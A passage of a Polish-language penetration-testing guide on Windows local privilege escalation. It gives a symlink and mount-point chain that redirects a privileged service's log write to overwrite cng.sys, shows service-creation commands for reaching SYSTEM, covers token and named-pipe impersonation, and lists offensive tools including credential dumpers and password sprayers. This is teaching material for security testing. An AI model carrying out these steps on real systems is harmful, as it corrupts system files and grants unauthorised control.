Gdy **uprzywilejowana usługa** zapisuje logi/eksporty do ścieżki odczytanej z **konfiguracji z prawem zapisu**, przekieruj tę ścieżkę za pomocą **symlinków Object Manager + punktów montowania NTFS**, aby zmienić uprzywilejowany zapis w nadpisanie dowolnego pliku (nawet **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Wymagania**
- Konfiguracja zawierająca ścieżkę docelową musi być zapisywalna przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` oraz symlinka pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca do tej ścieżki (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić uprzywilejowaną ścieżkę logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator uruchamia „wyślij testowy SMS”). Zapis trafia teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parser hex/PE), aby potwierdzić jego uszkodzenie; ponowne uruchomienie wymusza załadowanie przez Windows zmodyfikowanego sterownika → **DoS w pętli rozruchowej**. Można to również zastosować do każdego chronionego pliku, który uprzywilejowana usługa otwiera do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli jego kopia istnieje w `C:\Windows\System32\cng.sys`, może zostać podjęta próba załadowania jej w pierwszej kolejności, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do System**

### **Nowa usługa**

Jeśli już działasz w procesie High Integrity, **ścieżka do SYSTEM** może być łatwa — wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest on prawidłową usługą albo że szybko wykonuje niezbędne działania, ponieważ zostanie zakończony po 20 s, jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

Z procesu o wysokim poziomie integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell przy użyciu wrappera _**.msi**_.\
[Więcej informacji o powiązanych kluczach rejestru i instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### Wysoki poziom integralności + uprawnienie SeImpersonate do System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do uprawnień Full Token

Jeśli masz te uprawnienia tokena (prawdopodobnie znajdziesz je w procesie o wysokim poziomie integralności), możesz **otworzyć niemal dowolny proces** (z wyjątkiem procesów chronionych) przy użyciu uprawnienia SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika zwykle polega na **wybraniu dowolnego procesu działającego jako SYSTEM ze wszystkimi uprawnieniami tokena** (_tak, można znaleźć procesy SYSTEM bez wszystkich uprawnień tokena_).\
**Przykład kodu wykonującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Tej techniki używa meterpreter do eskalacji uprawnień w `getsystem`. Polega ona na **utworzeniu pipe'a, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego pipe'a**. Następnie **serwer**, który utworzył pipe przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe'a (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o named pipes, przeczytaj ten tekst**](#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**przejścia z wysokiego poziomu integralności do System przy użyciu named pipes, przeczytaj ten tekst**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć dll** **ładowaną** przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z jego uprawnieniami. Dlatego Dll Hijacking jest również przydatny w tego rodzaju eskalacji uprawnień. Co więcej, **znacznie łatwiej przeprowadzić go z procesu o wysokim poziomie integralności**, ponieważ będzie on miał **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Więcej o Dll hijacking możesz** [**dowiedzieć się tutaj**](dll-hijacking/index.html)**.**

### **Od Administratora lub Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE lub NETWORK SERVICE do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i wrażliwe pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryte.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje niektóre możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia informacje o zapisanych sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj lokalnie opcji -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia dane uwierzytelniające z Credential Manager. Wykryte.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza password spraying z zebranymi hasłami w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS i ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowe rozpoznanie Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane podatności privesc (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (wymaga kompilacji w VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Przeszukuje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga kompilacji) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia dane uwierzytelniające z wielu programów (precompiled exe na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp w C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (precompiled plik wykonywalny na github). Niezalecane. Nie działa poprawnie w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa poprawnie w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego wpisu (do poprawnego działania nie wymaga accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik polecenia **systeminfo** i rekomenduje działające exploity (lokalny Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik polecenia **systeminfo** i rekomenduje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt przy użyciu odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić zainstalowaną wersję .NET na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacja uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — warsztaty z lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień — Windows — kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — eskalacja uprawnień — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: phishing z użyciem makra Word VBA przez SMTP → odszyfrowanie poświadczeń hMailServer → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak z format string + stack BOF → VirtualAlloc ROP (RCE) i kradzież tokenu jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — W pogoni za Silver Fox: kot i mysz w cieniach jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Luka w uprzywilejowanym systemie plików w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania symbolic links — użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Nadużywanie symbolic links w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: niebezpieczne rozpoznawanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — wyzwania z checklisty C/C++, rozwiązania](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie CLDFLT i wyścigów w jądrze DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: pełny prymityw odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Nadużywanie dowolnego usuwania plików do eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — ataki na WSUS, część 2: CVE-2020-1013, jednodniowa luka umożliwiająca lokalną eskalację uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — delegowanie ograniczone oparte na zasobach Kerberos: gdy zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — wyodrębnianie kluczy prywatnych SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — zamienianie serwerów aktualizacji w przedsiębiorstwie w fabryki backdoorów (0_o) — część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — zamienianie serwerów aktualizacji w przedsiębiorstwie w fabryki backdoorów (0_o) — część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — eskalacja uprawnień przez usunięcie folderu Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec — Total Recall: odtworzenie kroków prowadzących z powrotem do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group — zalecenie dotyczące eskalacji uprawnień przez przesunięcia w pamięci współdzielonej Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
